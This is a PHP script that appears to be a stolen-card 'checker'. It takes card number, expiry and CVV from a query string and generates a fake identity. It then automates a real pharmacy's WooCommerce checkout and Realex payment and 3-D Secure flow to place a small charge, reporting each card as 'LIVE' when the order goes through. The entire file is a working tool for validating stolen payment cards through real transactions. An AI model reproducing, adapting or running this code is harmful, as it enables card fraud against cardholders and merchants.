<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end)
    {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
    function RandomString($length = 7)
    {
        $characters =
            '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
 
    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();
    $randomShits = file_get_contents(
        'https://namegenerator.in/assets/refresh.php?location=united-states'
    );
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state . " ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://www.medicare.ie/product/medela-breastmilk-bottle-cap/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: multipart/form-data; boundary=----WebKitFormBoundaryvBqAWWuwnL5FRrZ2',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        ],
        CURLOPT_POSTFIELDS => "------WebKitFormBoundaryvBqAWWuwnL5FRrZ2\r\nContent-Disposition: form-data; name=\"quantity\"\r\n\r\n1\r\n------WebKitFormBoundaryvBqAWWuwnL5FRrZ2\r\nContent-Disposition: form-data; name=\"add-to-cart\"\r\n\r\n422\r\n------WebKitFormBoundaryvBqAWWuwnL5FRrZ2--",
    ]); $_INIT = curl_exec($ch);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://www.medicare.ie/checkout/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        ],
    ]); $_BRIDGE = GetStr(
        curl_exec($ch),
        'name="woocommerce-process-checkout-nonce" value="',
        '"'
    );
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://www.medicare.ie/?wc-ajax=checkout',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            'accept: application/json, text/javascript, */*; q=0.01',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        ],
        CURLOPT_POSTFIELDS => "billing_first_name=$fname&billing_last_name=$lname&billing_company=&billing_country=IE&billing_address_1=hastelaman+11&billing_address_2=&billing_city=LOS+ANGELES&billing_state=CW&billing_postcode=T45+X042&billing_phone=%2B639105113493&billing_email=$email&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=IE&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=local_pickup%3A1&payment_method=realex_redirect&woocommerce-process-checkout-nonce=$_BRIDGE&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review",
    ]); curl_exec($ch); $_STRIP = GetStr(urldecode(stripslashes(curl_exec($ch))), '"redirect":"', '"');
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $_STRIP,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        ],
    ]);
    foreach (
        explode(
            "<input type=\"hidden\"",
            GetStr(
                curl_exec($ch),
                '<form action="https://pay.realexpayments.com/pay" method="post">',
                "</form>"
            )
        )
        as $_SYNC
    ) {
        $_GRASP[GetStr($_SYNC, 'name="', '"')] = GetStr($_SYNC, 'value="', '"');
    }
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://pay.realexpayments.com/pay',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        ],
        CURLOPT_POSTFIELDS => http_build_query($_GRASP),
    ]); $guid = GetStr(
        curl_exec($ch),
        "https://pay.realexpayments.com/card.html?guid=",
        "\r\n"
    ); $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://pay.realexpayments.com/3ds2/verifyEnrolled',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/card.html?guid=' . $guid,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        ],
        CURLOPT_POSTFIELDS => "pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum=$cc&cardIdentifyError=&pas_expiry=&pas_cccvc=&pas_issuenumber=&pas_ccname=$fname+$lname&guid=$guid&dccchoice=&dccrate=",
    ]); curl_exec($ch);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://pay.realexpayments.com/api/cardIdentification',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/card.html?guid=' . $guid,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        ],
        CURLOPT_POSTFIELDS => "pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum=$cc&cardIdentifyError=&pas_expiry=&pas_cccvc=&pas_issuenumber=&pas_ccname=$fname+$lname&guid=$guid&dccchoice=&dccrate=",
    ]); $_TYPE = GetStr(curl_exec($ch), '"cardtype":"', '"');
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://pay.realexpayments.com/api/auth',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/card.html?guid=' . $guid,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        ],
        CURLOPT_POSTFIELDS =>
            "pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum=$cc&cardIdentifyError=&pas_expiry=$mm%2F" .
            substr($yy, 2, 4) .
            "&pas_cccvc=$cvv&pas_issuenumber=&pas_ccname=$fname+$lname&guid=$guid&dccchoice=&dccrate=&browserJavaEnabled=false&browserLanguage=en-US&screenColorDepth=24&screenHeight=1080&screenWidth=1920&timezoneUtcOffset=-480&paymentFormHeight=489&paymentFormWidth=600",
    ]); $_ENC = json_decode(curl_exec($ch), true);$_ENVIRONMENT = $_ENC['data']['verifyEnrolledResult']['acsurl']; $_STAMP = urlencode($_ENC['data']['verifyEnrolledResult']['pareq']);$_SAGE = urlencode($_ENC['data']['encryptMerchantData']);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $_ENVIRONMENT,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        ],
        CURLOPT_POSTFIELDS => "PaReq=$_STAMP&MD=$_SAGE&TermUrl=https%3A%2F%2Fpay.realexpayments.com%2Facs%2FthreeDSecure",
    ]); $_GITUOK = urlencode(
        GetStr(curl_exec($ch), '<input type="hidden" name="PaRes" value="', '"')
    );
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://pay.realexpayments.com/acs/threeDSecure',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://aacsw.3ds.verifiedbyvisa.com',
            'Referer: https://aacsw.3ds.verifiedbyvisa.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        ],
        CURLOPT_POSTFIELDS => "PaRes=$_GITUOK&MD=$_SAGE",
    ]); $_SIMP = GetStr(curl_exec($ch), "Location: ", "\r\n");
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $_SIMP,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://aacsw.3ds.verifiedbyvisa.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        ],
    ]); $_LOCAL = GetStr(
        curl_exec($ch),
        '<script type="text/javascript">window.top.location.href = "',
        '"'
    );

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $_LOCAL,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://pay.realexpayments.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        ],
    ]); $_INT = curl_exec($ch);
    $_VER = GetStr(
        GetStr($_INT, '<ul class="woocommerce-error" role="alert">', '</ul>'),
        '<li>',
        '</li>'
    );
    if (strpos($_INT, 'order-received')) {
        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">' .
            $lista .
            '</span></td> <td><span class="badge badge-success badge-pill">Charged €2.85</span></td></tr><br>';
    } elseif (strpos($_INT, 'unsuccessful')) {
        echo '<tr><td><span class="badge badge-dark badge-pill">' .
            $lista .
            '</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">' .
            $_VER .
            '</span></td> <td><span class="badge badge-info badge-pill">Took ' .
            number_format(microtime(true) - $time_start, 2) .
            ' seconds</span></td></tr><br>';
    }

    curl_close($ch);
    unlink("$cookie.txt"); ?>
